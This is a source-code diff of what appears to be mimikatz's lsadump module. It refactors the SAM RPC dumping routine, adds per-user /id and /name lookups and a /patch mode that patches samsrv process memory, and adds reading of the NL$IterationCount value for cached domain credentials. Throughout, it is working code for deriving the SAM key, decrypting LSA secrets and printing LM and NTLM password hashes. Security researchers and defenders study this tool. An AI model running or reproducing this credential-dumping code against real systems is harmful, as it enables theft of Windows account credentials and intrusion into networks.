@@ -196,7 +196,7 @@ BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY
 		for(i = 0; !status && (i < sizeof(kuhl_m_lsadump_CONTROLSET_SOURCES) / sizeof(wchar_t *)); i++)
 		{
 			szNeeded = sizeof(DWORD); 
-			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], 0, NULL, (LPBYTE) &controlSet, &szNeeded);
+			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
 		}
 
 		if(status)
@@ -252,11 +252,11 @@ BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, I
 		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", 0, KEY_READ, &hComputerNameOrLSA))
 		{
 			szNeeded = 0;
-			if(kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", 0, NULL, NULL, &szNeeded))
+			if(kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", NULL, NULL, NULL, &szNeeded))
 			{
 				if(computerName = (wchar_t *) LocalAlloc(LPTR, szNeeded + sizeof(wchar_t)))
 				{
-					if (kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", 0, NULL, (LPBYTE)computerName, &szNeeded))
+					if (kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", NULL, NULL, (LPBYTE)computerName, &szNeeded))
 					{
 						kprintf(L"%s\n", computerName);
 						if (callbackCtx && callbackCtx->pCompNameHandler)
@@ -327,11 +327,11 @@ BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN H
 										if(kull_m_registry_RegOpenKeyEx(hRegistry, hUsers, user, 0, KEY_READ, &hUser))
 										{
 											szUser = 0;
-											if(kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", 0, NULL, NULL, &szUser))
+											if(kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", NULL, NULL, NULL, &szUser))
 											{
 												if(pUAv = (PUSER_ACCOUNT_V) LocalAlloc(LPTR, szUser))
 												{
-													if(status &= kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", 0, NULL, (LPBYTE) pUAv, &szUser))
+													if(status &= kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", NULL, NULL, (LPBYTE) pUAv, &szUser))
 													{
 														kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
 														hasLmHash = kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE, lmHash);
@@ -381,7 +381,7 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 	{
 		MD5Init(&md5ctx);
 		MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-		MD5Update(&md5ctx, (PBYTE) &rid, sizeof(DWORD));
+		MD5Update(&md5ctx, &rid, sizeof(DWORD));
 		MD5Update(&md5ctx, isNtlm ? kuhl_m_lsadump_NTPASSWORD : kuhl_m_lsadump_LMPASSWORD , isNtlm ? sizeof(kuhl_m_lsadump_NTPASSWORD) : sizeof(kuhl_m_lsadump_LMPASSWORD));
 		MD5Final(&md5ctx);
 
@@ -413,11 +413,11 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 	DWORD szNeeded = 0;
 
 	kprintf(L"\nSAMKey : ");
-	if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", 0, NULL, NULL, &szNeeded))
+	if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", NULL, NULL, NULL, &szNeeded))
 	{
 		if(pDomAccF = (PDOMAIN_ACCOUNT_F) LocalAlloc(LPTR, szNeeded))
 		{
-			if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", 0, NULL, (LPBYTE) pDomAccF, &szNeeded))
+			if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", NULL, NULL, (LPBYTE) pDomAccF, &szNeeded))
 			{
 				MD5Init(&md5ctx);
 				MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
@@ -459,7 +459,7 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 		if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicy, L"PolRevision", 0, KEY_READ, &hPolRev))
 		{
 			szNeeded = sizeof(POL_REVISION);
-			if(kull_m_registry_RegQueryValueEx(hSecurity, hPolRev, NULL, 0, NULL, (LPBYTE) &polRevision, &szNeeded))
+			if(kull_m_registry_RegQueryValueEx(hSecurity, hPolRev, NULL, NULL, NULL, (LPBYTE) &polRevision, &szNeeded))
 			{
 				kprintf(L"\nPolicy subsystem is : %hu.%hu\n", polRevision.Major, polRevision.Minor);
 				if (callbackCtx && callbackCtx->pPolicyVersionHandler)
@@ -467,11 +467,11 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 
 				if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicy, (polRevision.Minor > 9) ? L"PolEKList" : L"PolSecretEncryptionKey", 0, KEY_READ, &hEncKey))
 				{
-					if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, 0, NULL, NULL, &szNeeded))
+					if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, NULL, NULL, NULL, &szNeeded))
 					{
 						if(buffer = LocalAlloc(LPTR, szNeeded))
 						{
-							if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, 0, NULL, (LPBYTE) buffer, &szNeeded))
+							if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, NULL, NULL, (LPBYTE) buffer, &szNeeded))
 							{   
 								if(polRevision.Minor > 9) // NT 6
 								{
@@ -585,7 +585,7 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 											{
 												kprintf(L"\n**NTLM**: ");
 												MD4Init(&ctx);
-												MD4Update(&ctx, (LPCBYTE) pCurrent, dwCurrentSize);
+												MD4Update(&ctx, pCurrent, dwCurrentSize);
 												MD4Final(&ctx);
 												kull_m_string_wprintf_hex(ctx.digest, MD4_DIGEST_LENGTH, 0);
 												pDigest = ctx.digest;
@@ -659,6 +659,19 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 		{
 			if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ, &hCache))
 			{
+				if(lsaKeysStream)
+				{
+					kprintf(L"\n");
+					if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE) &i, &szNeeded))
+					{
+						j = (i > 10240) ? (i & ~0x3ff) : (i << 10);
+						kprintf(L"* NL$IterationCount is %u, %u real iteration(s)\n", i, j);
+						if(!i)
+							kprintf(L"* DCC1 mode !\n");
+					}
+					else kprintf(L"* Iteration is set to default (10240)\n");
+				}
+
 				if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
 				{
 					szMaxValueNameLen++;
@@ -672,7 +685,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 								szSecret = szMaxValueLen;
 								if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, NULL, (LPBYTE) pMsCacheEntry, &szSecret))
 								{
-									if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || !(pMsCacheEntry->flags & 1))
+									if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || (_wcsnicmp(secretName, L"NL$IterationCount", 17) == 0) || !(pMsCacheEntry->flags & 1))
 										continue;
 
 									pMsCacheData = (PBYTE) pMsCacheEntry->enc_data;
@@ -756,11 +769,11 @@ void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, 
 	wchar_t * objectName;
 	if(kull_m_registry_RegOpenKeyEx(hSystem, hSystemBase, serviceName, 0, KEY_READ, &hService))
 	{
-		if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", 0, NULL, NULL, &szNeeded))
+		if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", NULL, NULL, NULL, &szNeeded))
 		{
 			if(objectName = (wchar_t *) LocalAlloc(LPTR, szNeeded + sizeof(wchar_t)))
 			{
-				if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", 0, NULL, (LPBYTE) objectName, &szNeeded))
+				if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", NULL, NULL, (LPBYTE) objectName, &szNeeded))
 					kprintf(L" / service \'%s\' with username : %s", serviceName, objectName);
 
 				if (pObjectName)
@@ -781,13 +794,13 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
 
 	kprintf(L"Decrypting secret");
-	if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, NULL, &szSecret))
+	if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, NULL, NULL, NULL, &szSecret))
 	{
 		kprintf(L"Secret size value queried");
 		if(secret = (PBYTE) LocalAlloc(LPTR, szSecret))
 		{
 			kprintf(L"Memory allocated");
-			if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, secret, &szSecret))
+			if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, NULL, NULL, secret, &szSecret))
 			{
 				kprintf(L"Secret value queried");
 				if(lsaKeysStream)
@@ -844,7 +857,6 @@ BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 		}
 		else PRINT_ERROR(L"LocalAlloc failed - Secret");
 	}
-	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx Secret value KO\n");
 
 	return status;
 }
@@ -946,12 +958,12 @@ void kuhl_m_lsadump_hmac_md5(LPCVOID key, DWORD szKey, LPCVOID data, DWORD szDat
 		k_opad[i] ^= '\\\\\\\\';
 	}
 	MD5Init(&context);
-	MD5Update(&context, (LPCBYTE) k_ipad, sizeof(k_ipad));
-	MD5Update(&context, (LPCBYTE) data, szData);
+	MD5Update(&context, k_ipad, sizeof(k_ipad));
+	MD5Update(&context, data, szData);
 	MD5Final(&context);
 	RtlCopyMemory(buffer, context.digest, MD5_DIGEST_LENGTH);
 	MD5Init(&context);
-	MD5Update(&context, (LPCBYTE) k_opad, sizeof(k_opad));
+	MD5Update(&context, k_opad, sizeof(k_opad));
 	MD5Update(&context, buffer, sizeof(buffer));
 	MD5Final(&context);
 	RtlCopyMemory(output, context.digest, MD5_DIGEST_LENGTH);
@@ -981,11 +993,15 @@ NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
 	LSA_OBJECT_ATTRIBUTES objectAttributes;
 	LSA_HANDLE hPolicy;
 	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
-	PSAMPR_USER_INFO_BUFFER pUserInfoBuffer;
-	SAMPR_HANDLE hSam, hDomain, hUser;
+	SAMPR_HANDLE hSam, hDomain;
 	PSAMPR_RID_ENUMERATION pEnumBuffer = NULL;
 	DWORD CountRetourned, EnumerationContext = 0;
 	DWORD rid, i;
+	UNICODE_STRING uName;
+	PCWCHAR szRid = NULL, szName = NULL;
+	PUNICODE_STRING puName = NULL;
+	PDWORD pRid = NULL, pUse = NULL;
+	PWCHAR sid;
 
 	SERVICE_STATUS_PROCESS ServiceStatusProcess;
 	PKULL_M_MEMORY_HANDLE hMemory;
@@ -996,7 +1012,8 @@ NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
 	KULL_M_MEMORY_SEARCH sMemory;
 	PKULL_M_PATCH_GENERIC currentSamSrvReference;
 
-	if(argc)
+	static BOOL isPatching = FALSE;
+	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
 		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, sizeof(SamSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), MIMIKATZ_NT_BUILD_NUMBER))
 		{
@@ -1012,8 +1029,10 @@ NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
 						{
 							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
 							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
-							if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_samrpc, 0, NULL, NULL))
+							isPatching = TRUE;
+							if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_samrpc, argc, argv, NULL))
 								PRINT_ERROR_AUTO(L"kull_m_patch");
+							isPatching = FALSE;
 						} else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
 						kull_m_memory_close(hMemory);
 					}
@@ -1028,43 +1047,59 @@ NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
 		{
 			if(NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID *) &pPolicyDomainInfo)))
 			{
-				status = SamConnect(NULL, &hSam, 0x000F003F, 0);
+				status = SamConnect(NULL, &hSam, 0x000F003F, FALSE);
 				if(NT_SUCCESS(status))
 				{
 					status = SamOpenDomain(hSam, 0x705, pPolicyDomainInfo->DomainSid, &hDomain);
 					if(NT_SUCCESS(status))
 					{
-						kprintf(L"Domain : %wZ\n", &pPolicyDomainInfo->DomainName);
-						do
+						kprintf(L"Domain : %wZ", &pPolicyDomainInfo->DomainName);
+						if(ConvertSidToStringSid(pPolicyDomainInfo->DomainSid, &sid))
 						{
-							enumStatus = SamEnumerateUsersInDomain(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
-							if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
+							kprintf(L" / %s", sid);
+							LocalFree(sid);
+						}
+						kprintf(L"\n");
+						
+						if(kull_m_string_args_byName(argc, argv, L"id", &szRid, NULL))
+						{
+							if(rid = wcstoul(szRid, NULL, 0))
 							{
-								for(i = 0; i < CountRetourned; i++)
+								status = SamLookupIdsInDomain(hDomain, 1, &rid, &puName, &pUse);
+								if(NT_SUCCESS(status))
 								{
-									rid = pEnumBuffer[i].RelativeId;
-									kprintf(L"\nRID  : %08x (%u)\nUser : %wZ\n", rid, rid, &pEnumBuffer[i].Name);
-									status = SamOpenUser(hDomain, 0x31b, rid, &hUser);
-									if(NT_SUCCESS(status))
-									{
-										status = SamQueryInformationUser(hUser, UserInternal1Information, &pUserInfoBuffer);
-										if(NT_SUCCESS(status))
-										{
-											kprintf(L"LM   : ");
-											if(pUserInfoBuffer->Internal1.LmPasswordPresent)
-												kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
-											kprintf(L"\nNTLM : ");
-											if(pUserInfoBuffer->Internal1.NtPasswordPresent)
-												kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
-											kprintf(L"\n");
-											SamFreeMemory(pUserInfoBuffer);
-										} else PRINT_ERROR(L"SamQueryInformationUser %08x\n", status);
-										SamCloseHandle(hUser);
-									} else PRINT_ERROR(L"SamOpenUser %08x\n", status);
-								}
-								SamFreeMemory(pEnumBuffer);
-							} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
-						} while(enumStatus == STATUS_MORE_ENTRIES);
+									kuhl_m_lsadump_samrpc_user(hDomain, rid, puName);
+									SamFreeMemory(puName);
+									SamFreeMemory(pUse);
+								} else PRINT_ERROR(L"SamLookupIdsInDomain %08x\n", status);
+							}
+							else PRINT_ERROR(L"\'%s\' is not a valid Id\n", szRid);
+
+						}
+						else if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL))
+						{
+							RtlInitUnicodeString(&uName, szName);
+							status = SamLookupNamesInDomain(hDomain, 1, &uName, &pRid, &pUse);
+							if(NT_SUCCESS(status))
+							{
+								kuhl_m_lsadump_samrpc_user(hDomain, *pRid, &uName);
+								SamFreeMemory(pRid);
+								SamFreeMemory(pUse);
+							} else PRINT_ERROR(L"SamLookupNamesInDomain %08x\n", status);
+						}
+						else
+						{
+							do
+							{
+								enumStatus = SamEnumerateUsersInDomain(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
+								if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
+								{
+									for(i = 0; i < CountRetourned; i++)
+										kuhl_m_lsadump_samrpc_user(hDomain, pEnumBuffer[i].RelativeId, &pEnumBuffer[i].Name);
+									SamFreeMemory(pEnumBuffer);
+								} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
+							} while(enumStatus == STATUS_MORE_ENTRIES);
+						}
 						SamCloseHandle(hDomain);
 					} else PRINT_ERROR(L"SamOpenDomain %08x\n", status);
 					SamCloseHandle(hSam);
@@ -1075,4 +1110,30 @@ NTSTATUS kuhl_m_lsadump_samrpc(int argc, wchar_t * argv[])
 		}
 	}
 	return status;
+}
+
+void kuhl_m_lsadump_samrpc_user(SAMPR_HANDLE DomainHandle, DWORD rid, PUNICODE_STRING name)
+{
+	SAMPR_HANDLE hUser;
+	PSAMPR_USER_INFO_BUFFER pUserInfoBuffer;
+	NTSTATUS status;
+
+	kprintf(L"\nRID  : %08x (%u)\nUser : %wZ\n", rid, rid, name);
+	status = SamOpenUser(DomainHandle, 0x31b, rid, &hUser);
+	if(NT_SUCCESS(status))
+	{
+		status = SamQueryInformationUser(hUser, UserInternal1Information, &pUserInfoBuffer);
+		if(NT_SUCCESS(status))
+		{
+			kprintf(L"LM   : ");
+			if(pUserInfoBuffer->Internal1.LmPasswordPresent)
+				kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
+			kprintf(L"\nNTLM : ");
+			if(pUserInfoBuffer->Internal1.NtPasswordPresent)
+				kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
+			kprintf(L"\n");
+			SamFreeMemory(pUserInfoBuffer);
+		} else PRINT_ERROR(L"SamQueryInformationUser %08x\n", status);
+		SamCloseHandle(hUser);
+	} else PRINT_ERROR(L"SamOpenUser %08x\n", status);
 }
